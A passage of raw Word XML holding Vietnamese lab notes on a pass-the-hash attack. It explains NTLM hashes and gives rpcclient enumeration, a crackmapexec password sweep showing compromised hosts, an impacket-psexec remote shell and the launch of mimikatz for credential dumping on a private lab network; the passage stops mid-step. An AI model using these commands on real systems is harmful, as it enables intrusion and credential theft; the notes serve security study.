          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> (giá trị băm của mật khẩu)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F89ACB1">
      <w:pPr>
        <w:pStyle w:val="85"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:suppressLineNumbers w:val="0"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7EBE0A52">
      <w:pPr>
        <w:pStyle w:val="4"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:suppressLineNumbers w:val="0"/>
      </w:pPr>
      <w:r>
        <w:t>NTLM là gì?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67F7A0FE">
      <w:pPr>
        <w:pStyle w:val="85"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:suppressLineNumbers w:val="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="92"/>
        </w:rPr>
        <w:t>NTLM (NT LAN Manager)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> là một </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="92"/>
        </w:rPr>
        <w:t>giao thức xác thực</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> cũ của Microsoft, dùng để đăng nhập vào Windows và các dịch vụ mạng.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08BBC6CF">
      <w:pPr>
        <w:pStyle w:val="85"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:suppressLineNumbers w:val="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Khi một user đăng nhập, Windows </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="92"/>
        </w:rPr>
        <w:t>không gửi mật khẩu thô (plain password) qua mạng</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, mà gửi </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="92"/>
        </w:rPr>
        <w:t>một giá trị hash của mật khẩu</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, gọi là </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="92"/>
        </w:rPr>
        <w:t>NTLM hash</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18AB4724">
      <w:pPr>
        <w:pStyle w:val="85"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:suppressLineNumbers w:val="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Hash này được tạo từ mật khẩu của user bằng thuật toán </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="92"/>
        </w:rPr>
        <w:t>MD4 trên Unicode password</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (đối với NTLMv1/NTLMv2 thì phức tạp hơn một chút).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F498F9A">
      <w:pPr>
        <w:pStyle w:val="85"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:suppressLineNumbers w:val="0"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Hacker thu thập NTLM hash của user </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="44"/>
        </w:rPr>
        <w:t>Administrator</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> trên một máy nạn nhân.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AC180C1">
      <w:pPr>
        <w:pStyle w:val="85"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:suppressLineNumbers w:val="0"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Hacker dùng hash đó để kết nối tới máy khác trong mạng, ví dụ qua </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="44"/>
        </w:rPr>
        <w:t>psexec</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="450E556E">
      <w:pPr>
        <w:pStyle w:val="85"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:suppressLineNumbers w:val="0"/>
        <w:rPr>
          <w:rStyle w:val="92"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="SimSun" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="44"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="SimSun" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>impacket-psexec</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="SimSun" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> là </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="92"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="SimSun" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>một công cụ trong bộ Impacket</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="SimSun" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> dùng để </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="92"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="SimSun" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>thực thi lệnh hoặc mở shell trên máy Windows từ xa</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60B84800">
      <w:pPr>
        <w:pStyle w:val="85"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:suppressLineNumbers w:val="0"/>
        <w:rPr>
          <w:rStyle w:val="92"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="92"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t>Dấu hiệu hacker biết:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B0D7995">
      <w:pPr>
        <w:pStyle w:val="85"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:suppressLineNumbers w:val="0"/>
        <w:rPr>
          <w:rStyle w:val="92"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t>1.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="SimSun" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">Xác định </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="92"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="SimSun" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>dịch vụ SMB, RDP,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="92"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t xml:space="preserve"> mở</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44921C4B">
      <w:pPr>
        <w:pStyle w:val="85"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:suppressLineNumbers w:val="0"/>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="SimSun" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>Kiểm tra giao thức xác thực NTLM</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6678D490">
      <w:pPr>
        <w:pStyle w:val="85"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:suppressLineNumbers w:val="0"/>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t>rpcclient -U "Administrator" 192.168.8.121 -c "enumdomusers"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28CCEC75">
      <w:pPr>
        <w:pStyle w:val="85"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:suppressLineNumbers w:val="0"/>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t xml:space="preserve">Password for [WORKGROUP\Administrator]:                                       </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3992EF24">
      <w:pPr>
        <w:pStyle w:val="85"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:suppressLineNumbers w:val="0"/>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server trả </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="92"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="SimSun" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>danh sách user/domain</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="SimSun" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> → nghĩa là </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="92"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="SimSun" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>NTLM còn bật và cho phép kết nối SMB/RPC</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="SimSun" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16C4443E">
      <w:pPr>
        <w:pStyle w:val="85"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:suppressLineNumbers w:val="0"/>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t xml:space="preserve">3crackmapexec smb 192.168.8.0/24 -u Administrator -p 'admin123' </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13EA6FA3">
      <w:pPr>
        <w:pStyle w:val="85"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:suppressLineNumbers w:val="0"/>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t>SMB         192.168.8.121   445    WIN-D0OB76HB4C0  [*] Windows 7 Professional 7601 Service Pack 1 x64 (name:WIN-D0OB76HB4C0) (domain:WIN-D0OB76HB4C0) (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t>signing:False) (SMBv1:True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42ECE84F">
      <w:pPr>
        <w:pStyle w:val="85"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:suppressLineNumbers w:val="0"/>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t>SMB         192.168.8.122   445    KHUONG-PC        [*] Windows 7 Professional 7601 Service Pack 1 x64 (name:KHUONG-PC) (domain:Khuong-PC) (signing:False) (SMBv1:True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3933454E">
      <w:pPr>
        <w:pStyle w:val="85"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:suppressLineNumbers w:val="0"/>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t>SMB         192.168.8.121   445    WIN-D0OB76HB4C0  [+] WIN-D0OB76HB4C0\Administrator:admin123 (Pwn3d!)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E29BB26">
      <w:pPr>
        <w:pStyle w:val="85"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:suppressLineNumbers w:val="0"/>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t>SMB         192.168.8.122   445    KHUONG-PC        [+] Khuong-PC\Administrator:admin123 (Pwn3d!)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49722205">
      <w:pPr>
        <w:pStyle w:val="85"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:suppressLineNumbers w:val="0"/>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="SimSun" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="SimSun" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">CME cho thấy </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="92"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="SimSun" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>SMB signing tắt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="SimSun" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> → PtH dễ thực hiện.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A58F2F1">
      <w:pPr>
        <w:pStyle w:val="85"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:suppressLineNumbers w:val="0"/>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="SimSun" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="SimSun" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">Nếu </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="92"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="SimSun" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>SMB signing bật → hệ thống kiểm tra “chữ ký” của gói SMB”</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="SimSun" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">, hacker </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="92"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="SimSun" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>không thể dùng hash giả mạo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="SimSun" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> để đăng nhập mà không tạo chữ ký hợp lệ.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72E5EF9F">
      <w:pPr>
        <w:pStyle w:val="85"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:suppressLineNumbers w:val="0"/>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="SimSun" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">User </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="44"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="SimSun" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>Administrator</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="SimSun" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="92"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="SimSun" w:cs="Times New Roman"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>có cùng mật khẩu trên nhiều máy</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A887AF3">
      <w:pPr>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:suppressLineNumbers w:val="0"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:beforeLines="0" w:beforeAutospacing="0"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t>Sau khi đã tấn công crark pass victim 1 và put file mimikatz.exe qua victim 1 thực hiện đăng nhập  và thực thi file</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:br w:type="textWrapping"/>
      </w:r>
      <w:bookmarkStart w:id="0" w:name="_GoBack"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t>impacket-psexec Administrator:password@192.168.8.121 cmd.exe</w:t>
      </w:r>
      <w:bookmarkEnd w:id="0"/>
    </w:p>
    <w:p w14:paraId="4BBEFFBE">
      <w:pPr>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:suppressLineNumbers w:val="0"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:beforeLines="0" w:beforeAutospacing="0"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t>cd C:\Windows\Temp</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74FD7D3A">
      <w:pPr>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:suppressLineNumbers w:val="0"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:beforeLines="0" w:beforeAutospacing="0"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t>mimikatz.exe</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D7EA97C">
      <w:pPr>
        <w:pStyle w:val="3"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:suppressLineNumbers w:val="0"/>
        <w:spacing w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>Bước 1: Nâng quyền trong Mimikatz</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03DFE0CF">
      <w:pPr>
        <w:pStyle w:val="85"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:suppressLineNumbers w:val="0"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">Trong màn hình </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="44"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="18"/>
